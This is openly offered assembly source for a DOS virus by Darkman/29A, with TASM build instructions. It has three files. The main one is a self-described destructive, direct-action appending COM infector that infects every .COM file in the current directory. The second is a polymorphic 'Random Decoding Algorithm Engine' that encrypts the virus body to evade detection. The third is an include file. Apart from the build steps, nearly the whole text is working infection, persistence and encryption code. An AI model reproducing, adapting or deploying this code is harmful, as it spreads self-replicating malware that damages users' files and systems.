ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[rdaedemo.asm]ÄÄ
comment *
		 Random Decoding Algorithm Engine demo
				Code by
			      Darkman/29A

  Random Decoding Algorithm Engine demo is a 866 bytes direct action appending
  COM virus, infects every file in current diretory. Random Decoding Algorithm
  Engine demo has an error handler and is using the Random Decoding Algorithm
  Engine v 1.00 [RDAE]. Random Decoding Algorithm demo has a destructive
  payload.

  Compile Random Decoding Algorithm E... with Turbo Assembler v 5.0 by typing:
    TASM /M RDAEDEMO.ASM
    TLINK /x RDAEDEMO.OBJ
    EXE2BIN RDAEDEMO.EXE RDAEDEMO.COM
*

.model tiny
.code

code_begin:
	     cld			 ; Clear direction flag
	     mov     cx,05h		 ; CX = length of encrypted code
	     lea     si,[bp+origin_code] ; SI = offset of origin_code
	     push    si 		 ; Save SI at stack
call_imm16   equ     word ptr $+01h	 ; Offset of CALL imm16
	     call    first_gen
restore_code:
	     pop     si 		 ; Load SI from stack
	     mov     di,100h		 ; DI = offset of beginning of code
	     push    di 		 ; Save DI at stack
	     movsw			 ; Move the original code to beginning
	     movsw			 ;  "    "     "      "   "      "
	     movsb			 ;  "    "     "      "   "      "

	     mov     ax,3524h		 ; Get interrupt vector 24h
	     int     21h
	     push    bx es		 ; Save registers at stack

	     push    cs 		 ; Save CS at stack
	     pop     es 		 ; Load ES from stack (CS)

	     mov     ah,25h		 ; Set interrupt vector 24h
	     lea     dx,[bp+int24_virus] ; DX = offset of int24_virus
	     int     21h
	     push    ax 		 ; Save AX at stack

	     mov     ah,1ah		 ; Set Disk Transfer Area address
	     lea     dx,[bp+dta]	 ; DX = offset of dta
	     int     21h

	     mov     ah,4eh		 ; Find first matching file (DTA)
	     mov     cl,00100110b	 ; CL = file attribute mask
	     sub     dx,(dta-file_specifi)
find_next:
	     int     21h
	     jnc     infect_file	 ; No error? Jump to infect_file
virus_exit:
	     mov     ah,1ah		 ; Set disk transfer area address
	     mov     dx,80h		 ; DX = offset of default DTA
	     int     21h

	     pop     ax 		 ; Load AX from stack
	     pop     es bx		 ; Load registers from stack
	     int     21h

	     push    cs 		 ; Save CS at stack
	     pop     es 		 ; Load ES from stack (CS)

	     xor     ax,ax		 ; Zero AX
	     mov     bx,ax		 ;  "   BX
	     mov     cx,ax		 ;  "   CX
	     cwd			 ;  "   DX
	     mov     di,ax		 ;  "   DI
	     mov     si,ax		 ;  "   SI
	     mov     bp,ax		 ;  "   BP

	     ret			 ; Return
infect_file:
	     mov     ax,3d02h		 ; Open file (read/write)
	     lea     dx,[bp+filename]	 ; DX = offset of filename
	     int     21h
	     xchg    ax,bx		 ; BX = file handle
	     jc      close_file 	 ; Error? Jump to close_file

	     mov     ah,3fh		 ; Read from file
	     mov     cx,05h		 ; Read five bytes
	     sub     dx,(filename-origin_code)
	     int     21h

	     mov     si,dx		 ; SI = offset of origin_code
	     mov     ax,[si]		 ; AX = two bytes of origin_code
	     cmp     al,10111101b	 ; MOV BP,imm16 (opcode 0bdh)?
	     je      close_file 	 ; Already infected? Jump to close_...

	     xor     ax,'MZ'             ; EXE signature?
	     jz      close_file 	 ; Zero? Jump to close_file
	     xor     ax,('ZM' xor 'MZ')  ; EXE signature?
	     jz      close_file 	 ; Zero? Jump to close_file

	     mov     ax,4202h		 ; Set current file position (EOF)
	     cwd			 ; Zero DX
	     mov     cx,dx		 ;  "   CX
	     int     21h

	     cmp     ax,(code_end-code_begin)*02h
	     jb      close_file 	 ; Below? Jump to close_file
	     cmp     ax,0fefeh-(data_end-code_begin)
	     jbe     get_sys_time	 ; Below or equal? Jump to get_sys_...
close_file:
	     mov     ah,3eh		 ; Close file
	     int     21h

	     mov     ah,4fh		 ; Find next matching file (DTA)
	     jmp     find_next
get_sys_time:
	     add     ax,100h		 ; Add offset of beginning of code ...
	     mov     [bp+virus_offset],ax

	     mov     ah,2ch		 ; Get system time
	     int     21h

	     mov     al,00000001b	 ; AL = flags

	     cmp     ch,04h		 ; 4.00am?
	     jne     write_file 	 ; Below? Jump to write_file

	     inc     ax 		 ; AL = flags

	     cmp     cl,28h		 ; 4.40am?
	     jb      write_file 	 ; Above? Jump to write_file

	     inc     ax 		 ; AL = flags
write_file:
	     push    bx 		 ; Save BX at stack
	     mov     cx,05h		 ; CX = length of original code
	     call    rdae_encrypt
	     pop     bx 		 ; Load BX from stack

	     mov     ah,40h		 ; Write to file
	     mov     cx,(code_end-code_begin)
	     mov     dx,bp		 ; DX = delta offset
	     int     21h
	     cmp     ax,cx		 ; Written all of the virus?
	     jne     close_file_	 ; Not equal? Jump to close_file_

	     mov     ax,4200h		 ; Set current file position (SOF)
	     cwd			 ; Zero DX
	     mov     cx,dx		 ;  "   CX
	     int     21h

	     mov     ah,40h		 ; Write to file
	     mov     cl,05h		 ; Write five bytes
	     lea     dx,[bp+infect_code] ; DX = offset of infect_code
	     int     21h
close_file_:
	     mov     ax,5701h		 ; Set file's data and time
	     mov     cx,[bp+file_time]	 ; CX = file's time
	     mov     dx,[bp+file_date]	 ; DX = file's date
	     int     21h

	     jmp     close_file

int24_virus  proc    near		 ; Interrupt 24h of Random Decoding...
	     mov     al,03h		 ; Fail system call in progress

	     iret			 ; Interrupt return
	     endp
infect_code:
virus_offset equ     word ptr $+01h	 ; Offset of virus within infected ...
	     mov     bp,00h		 ; BP = delta offset

	     jmp     bp

include      rdae.asm			 ; Include Random Decoding Algorith...
file_specifi db      '*.COM',00h         ; File specification
origin_code  db      11001101b,00100000b,?,?,?,?
	     db      '[Random Decoding Algorithm Engine demo] '
	     db      '[Darkman/29A]'     ; Author of the virus
code_end:
dta:
	     db      15h dup(?) 	 ; Used by DOS for find next-process
file_attr    db      ?			 ; File attribute
file_time    dw      ?			 ; File time
file_date    dw      ?			 ; File date
filesize     dd      ?			 ; Filesize
filename     db      0dh dup(?) 	 ; Filename

include      rdae.inc			 ; Include Random Decoding Algorith...
data_end:
first_gen:
	     pop     bx ax		 ; Load registers from stack

	     std			 ; Set direction flag
	     mov     cx,(code_end-code_begin)
	     lea     di,code_end+105h-01h
	     lea     si,code_end+105h-06h
	     rep     movsb		 ; Move virus to delta offset

	     cld			 ; Clear direction flag
	     lea     ax,[origin_code+105h]
	     lea     bx,[restore_code+105h]
	     mov     bp,105h		 ; BP = delta offset
	     mov     [call_imm16+105h],(rdae_decrypt-restore_code)

	     push    ax bx		 ; Save registers at stack

	     ret			 ; Return

end	     code_begin
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[rdaedemo.asm]ÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[rdae.asm]ÄÄ
comment *
       Random Decoding Algorithm Engine v 1.00 [RDAE]  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
			  Code by		       ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
			Darkman/29A			ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
						       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
						       ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ

		 Calling parameters:
		   AL	  Flags (only when calling rdae_encrypt)
		   CX	  Length of original/encrypted code
		   BP	  Delta offset
		   DS:SI  Pointer to original/encrypted code

  Flags:
    xxxxxx00  Low security, high speed, 256 different algorithms.
    xxxxxx01  Medium security, medium speed, 65.536 different algorithms.
    xxxxxx10  High security, low speed, 16.777.216 different algorithms.
    xxxxxx11  Highest security, lowest speed, 4.294.967.296 different algorithms.

  Encryption/decryption algorithms:
    NOP; SEGCS; NEG AL; NOT AL; DEC AL; INC AL; ROL AL,01h; ROR AL,01h
    ADD AL,CL; ROL AL,CL; ROR AL,CL; SUB AL,CL; XOR AL,CL; ADD AL,imm8
    SUB AL,imm8; XOR AL,imm8

  Encryption/decryption keys:
    Eighty-one, random, 8-bit, with the possibility of being a sliding key.

  Checksum:
    32-bit Cyclic Redundancy Check (CRC-32), of the decryption algoritm.

  Levels of security:
    Four.

  Random Decoding Algorithm Engine v 1.00 [RDAE] length: 567 bytes.
*

rdae_begin:
rdae_encrypt proc    near		 ; Random Decoding Algorithm Engine...
	     push    cx si		 ; Save registers at stack
	     push    ax 		 ; Save AX at stack
	     call    prepare_rdae

	     mov     cl,(key_end-key_begin)
	     lea     di,[bp+key_table]	 ; DI = offset of key_table
gen_key_loop:
	     push    cx 		 ; Save CX at stack
gen_key_loo:
	     call    get_rnd_num

	     mov     cl,(key_end-key_begin)
	     lea     bx,[bp+key_table]	 ; BX = offset of key_table
cmp_key_loop:
	     cmp     [bx],al		 ; Current encryption/decryption k...?
	     je      gen_key_loo	 ; Equal? Jump to key_tab_loo

	     inc     bx 		 ; Increase index register

	     loop    cmp_key_loop
	     pop     cx 		 ; Load CX from stack

	     stosb			 ; Store 8-bit random number

	     loop    gen_key_loop

	     pop     cx 		 ; Load CX from stack (AX)
	     and     cx,0000000000000011b
	     inc     cx 		 ; CX = number of encryption/decryp...
	     mov     dx,cx		 ; DX =   "    "            "
	     lea     di,[bp+decrypt_algo]
gen_dec_loop:
	     mov     al,(algori_end_-algori_begin)/04h
	     call    rnd_in_range
	     shl     bl,01h		 ; Multiply 8-bit random number wit...
	     shl     bl,01h		 ;    "       "     "      "      "

	     lea     si,[bx+algori_table]
	     add     si,bp		 ; Add delta offset to offset withi...
	     movsw			 ; Move decryption algorithm

	     mov     al,(key_end-key_begin)
	     call    rnd_in_range
	     add     bx,bp		 ; Add delta offset to random numbe...
	     mov     al,[bx+key_table]	 ; AL = encryption/decryption key

	     push    ax si		 ; Save registers at stack
	     call    exam_sto_key

	     loop    gen_dec_loop

	     lea     di,[bp+encrypt_algo]
gen_enc_loop:
	     pop     si ax		 ; Load registers from stack
	     movsw			 ; Move encryption algorithm

	     call    exam_sto_key

	     dec     dx 		 ; Decrease count register
	     jnz     gen_enc_loop	 ; Not zero? Jump to gen_dec_loop

	     pop     si bx		 ; Load registers from stack
	     std			 ; Set direction flag
	     add     si,bx		 ; Add length of original code to p...
	     dec     si 		 ; SI = offset of last byte of plai...
	     mov     di,si		 ; DI =   "    "   "    "   "     "
encrypt_loop:
	     inc     cx 		 ; Increase count register

	     lodsb			 ; AL = byte of original code
encryp_begin:
encrypt_algo db      08h dup (?)	 ; Encryption algorithm
encryp_end:
	     stosb			 ; Store byte of encrypted code

	     cmp     cx,bx		 ; Encrypted all bytes of original...?
	     jne     encrypt_loop	 ; Not equal? Jump to encrypt_loop

	     call    calc_crc32

	     cld			 ; Clear direction flag
	     lea     di,[bp+crc32]	 ; DI = offset of crc32
	     stosw			 ; Store low-order word of CRC-32 c...
	     xchg    ax,dx		 ; DX = high-order word of CRC-32 c...
	     stosw			 ; Store high-order word of CRC-32 ...

	     jmp     rdae_exit
	     endp

rdae_decrypt proc    near		 ; Random Decoding Algorithm Engine...
	     push    cx si		 ; Load registers from stack
	     call    prepare_rdae
gen_dec_loo:
	     mov     cl,(decryp_end-decryp_begin)/02h
	     lea     di,[bp+decrypt_algo]
	     lea     si,[bp+decrypt_ptr] ; SI = offset of decrypt_ptr
	     push    si 		 ; Save SI at stack
gen_dec_loo_:
	     lodsw			 ; AX = offset within key_table
	     push    si 		 ; Save SI at stack

	     xchg    ax,si		 ; AX = offset within key_table
	     lodsb			 ; AL = encryption/decryption key
	     xchg    ax,bx		 ; BL = 	  "            "

	     pop     si 		 ; Load SI from stack
	     lodsw			 ; AX = offset within algori_table

	     push    si 		 ; Save SI at stack
	     xchg    ax,si		 ; AX = offset within algori_table
	     movsw			 ; Move decryption algorithm to dec...

	     xchg    ax,bx		 ; AL = encryption/decryption key
	     call    exam_sto_key
	     pop     si 		 ; Load SI from stack

	     loop    gen_dec_loo_
	     pop     di 		 ; Load DI from stack (SI)
inc_idx_loop:
	     mov     si,di		 ; SI = offset within decrypt_idx
	     lodsw			 ; AX = offset within key_table
	     xchg    ax,bx		 ; BX =   "      "        "
	     lodsw			 ; AX = offset within algori_table

	     lea     si,[bp+algori_end]  ; SI = offset of algori_end
	     cmp     ax,si		 ; Encryption/decryption algorithm...?
	     jb      dont_inc_key	 ; Below? Jump to dont_inc_key

	     inc     bx 		 ; Increase decryption key index po...

	     lea     si,[bp+key_end]	 ; SI = offset of key_end
	     cmp     bx,si		 ; End of table of encryption/decr...?
	     jne     sto_idx_ptrs	 ; Not equal? Jump to sto_idx_ptrs

	     lea     bx,[bp+key_table]	 ; AX = offset of key_table
dont_inc_key:
	     add     ax,04h		 ; Add four to offset within algori...

	     lea     si,[bp+algori_end_] ; SI = offset of algori_end_
	     cmp     ax,si		 ; End of table of encryption/decr...?
	     jne     sto_idx_ptrs	 ; Equal? Jump to sto_idx_ptrs

	     lea     ax,[bp+algori_table]
sto_idx_ptrs:
	     xchg    ax,bx		 ; AX = offset within key_table
	     stosw			 ; Store offset within key_table

	     xchg    ax,bx		 ; AX = offset within algori_table
	     stosw			 ; Store offset within algori_table

	     lea     si,[bp+algori_table]
	     cmp     ax,si		 ; Beginning of table of encryptio...?
	     je      inc_idx_loop	 ; Equal? Jump to inc_idx_loop

	     call    calc_crc32
	     cmp     ax,word ptr [bp+crc32]
	     jne     gen_dec_loo	 ; Not equal? Jump to gen_dec_loo
	     cmp     dx,word ptr [bp+crc32+02h]
	     jne     gen_dec_loo	 ; Not equal? Jump to gen_dec_loo

	     pop     si cx		 ; Load registers from stack
	     mov     di,si		 ; DI = offset of encrypted code
decrypt_loop:
	     lodsb			 ; AL = byte of encrypted code
decryp_begin:
decrypt_algo db      08h dup (?)	 ; Decryption algorithm
decryp_end:
	     stosb			 ; Store byte of decrypted code

	     loop    decrypt_loop
rdae_exit:
	     call    wipeout_info

	     ret			 ; Return
	     endp

prepare_rdae proc    near		 ; Prepare Random Decoding Algorith...
	     lea     di,[bp+crc32_table] ; DI = offset of crc32_table

	     xor     bx,bx		 ; Zero BX
gen_crc_tbl_:
	     xor     ax,ax		 ; Zero AX
	     cwd			 ;  "   DX

	     mov     al,bl		 ; AL = count register
	     mov     cx,08h		 ; Rotate CRC-32 through carry atle...
calc_crc_tbl:
	     shr     dx,01h		 ; Shift logical right highh-order ...
	     rcr     ax,01h		 ; Rotate low-order word of CRC-32 ...
	     jnc     dont_xor_crc	 ; No carry? Jump to dont_xor_crc

	     xor     ax,8320h		 ; AX = low-order word of CRC-32 in...
	     xor     dx,0edb8h		 ; DX = high-order word of CRC-32 i...
dont_xor_crc:
	     loop    calc_crc_tbl

	     stosw			 ; Store low-order word of CRC-32 i...
	     xchg    ax,dx		 ; AX = high-order word of CRC-32 i...
	     stosw			 ; Store high-order word of CRC-32 ...
	     xchg    ax,dx		 ; AX = low-order word of CRC-32 in...

	     inc     bl 		 ; Increase count register
	     jnz     gen_crc_tbl_	 ; Not zero? Jump to gen_crc_tbl_

wipeout_info proc    near		 ; Wipeout information
	     mov     al,10010000b	 ; NOP (opcode 90h)
	     mov     cl,08h		 ; Store eight NOPs
	     lea     di,[bp+encrypt_algo]
	     rep     stosb		 ; Store NOPs

	     mov     cl,08h		 ; Store eight NOPs
	     add     di,(decrypt_algo-encryp_end)
	     rep     stosb		 ; Store NOPs

	     lea     ax,[bp+key_table]	 ; BX = offset of key_table
	     lea     bx,[bp+algori_table]
	     mov     cl,04h		 ; Store four decryption algorithm ...
	     lea     di,[bp+decrypt_ptr] ; DI = offset of decrypt_ptr
sto_idx_loop:
	     stosw			 ; Store offset of key_table
	     xchg    ax,bx		 ; AX = offset of algori_table
	     stosw			 ; Store offset of algori_table
	     xchg    ax,bx		 ; AX = offset of key_table

	     loop    sto_idx_loop
	     ret			 ; Return!
	     endp
	     endp

calc_crc32   proc    near		 ; Calculate CRC-32 checksum
	     mov     cx,(decryp_end-decryp_begin)
	     lea     si,[bp+decrypt_algo]

	     mov     ax,-01h		 ; AX = low-order word of CRC-32 ch...
	     mov     dx,ax		 ; DX = high-order word of CRC-32 c...
crc32_loop:
	     xor     bx,bx		 ; Zero BX

	     mov     bl,[si]		 ; BL = low-order byte of index reg...
	     inc     si 		 ; Increase index register

	     xor     bl,al		 ; BL = low-order byte of index reg...
	     shl     bx,01h		 ; Multiply index register by four
	     shl     bx,01h		 ;    "       "      "     "   "

	     mov     al,ah		 ; AL = low-order byte of low-order...
	     mov     ah,dl		 ; AH = high-order byte of low-orde...
	     mov     dl,dh		 ; DL = low-order byte of low-order...
	     xor     dh,dh		 ; Zero DH

	     add     bx,bp		 ; Add delta offset to offset withi...
	     xor     ax,word ptr [bx+crc32_table]
	     xor     dx,word ptr [bx+crc32_table+02h]

	     loop    crc32_loop

	     not     dx 		 ; AX = low-order word of CRC-32 ch...
	     not     ax 		 ; DX = high-order word of CRC-32 c...

	     ret			 ; Return!
	     endp

; Modified version of the Random Number Generator (RNG) used in the Rickety
; and Hardly Insidious yet New Chaos Engine v 2.00 [RHINCE] by
; Rhincewind/VLAD.
get_rnd_num  proc    near		 ; Get 8-bit random number
	     in      al,40h		 ; AL = 8-bit random number

	     adc     [bp+random_num],al  ; Add current 8-bit random number ...
random_num   equ     byte ptr $+01h	 ; 8-bit random number
	     mov     ax,00h		 ; AX = 8-bit random number

	     ret			 ; Return!
	     endp

rnd_in_range proc    near		 ; Get random number within range
	     xchg    ax,bx		 ; BL = number within range
	     call    get_rnd_num

	     div     bl 		 ; AH = random number within range
	     mov     bl,ah		 ; BL =   "      "      "      "
	     xor     bh,bh		 ; Zero BH

	     ret			 ; Return!
	     endp

exam_sto_key proc    near		 ; Examine, store encryption/decryp...
	     lea     bx,[bp+algori_end]  ; BX = offset of algori_end
	     cmp     si,bx		 ; Encryption/decryption algorithm...?
	     jbe     dont_sto_key	 ; Below or equal? Jump to dont_sto...

	     dec     di 		 ; DI = offset of encryption/decryp...
	     stosb			 ; Store encryption/decryption key
dont_sto_key:
	     ret			 ; Return!
	     endp

	     db      ' [RDAE] '          ; Name of the engine
algori_table:
algori_begin:
	     nop			 ; Decryption algorithm
	     nop			 ; Decryption	  "
	     nop			 ; Encryption	  "
	     nop			 ; Encryption	  "
	     segcs			 ; Decryption	  "
	     segcs			 ; Decryption	  "
	     segcs			 ; Encryption	  "
	     segcs			 ; Encryption	  "
	     not     al 		 ; Decryption	  "
	     not     al 		 ; Encryption	  "
	     neg     al 		 ; Decryption	  "
	     neg     al 		 ; Encryption	  "
	     inc     al 		 ; Decryption	  "
	     dec     al 		 ; Encryption	  "
	     dec     al 		 ; Decryption	  "
	     inc     al 		 ; Encryption	  "
	     ror     al,01h		 ; Decryption	  "
	     rol     al,01h		 ; Encryption	  "
	     rol     al,01h		 ; Decryption	  "
	     ror     al,01h		 ; Encryption	  "
	     xor     al,cl		 ; Decryption	  "
	     xor     al,cl		 ; Encryption	  "
	     sub     al,cl		 ; Decryption	  "
	     add     al,cl		 ; Encryption	  "
	     ror     al,cl		 ; Decryption	  "
	     rol     al,cl		 ; Encryption	  "
	     rol     al,cl		 ; Decryption	  "
	     ror     al,cl		 ; Encryption	  "
	     add     al,cl		 ; Decryption	  "
	     sub     al,cl		 ; Encryption	  "
algori_end:
	     xor     al,00h		 ; Encryption	  "
	     xor     al,00h		 ; Decryption	  "
	     sub     al,00h		 ; Encryption	  "
	     add     al,00h		 ; Decryption	  "
	     add     al,00h		 ; Encryption	  "
	     sub     al,00h		 ; Decryption	  "
algori_end_:
crc32	     dd      ?			 ; CRC-32 of the decryption algorithm
key_begin:
key_table    db      51h dup(?) 	 ; Table of encryption/decryption keys
key_end:
rdae_end:
rdae_length  equ     (rdae_end-rdae_begin)
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[rdae.asm]ÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[rdae.inc]ÄÄ
crc32_table  db      400h dup(?)	 ; CRC-32 initial table
decrypt_ptr  dw      08h dup(?) 	 ; Decryption algorithm and key poi...
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[rdae.inc]ÄÄ
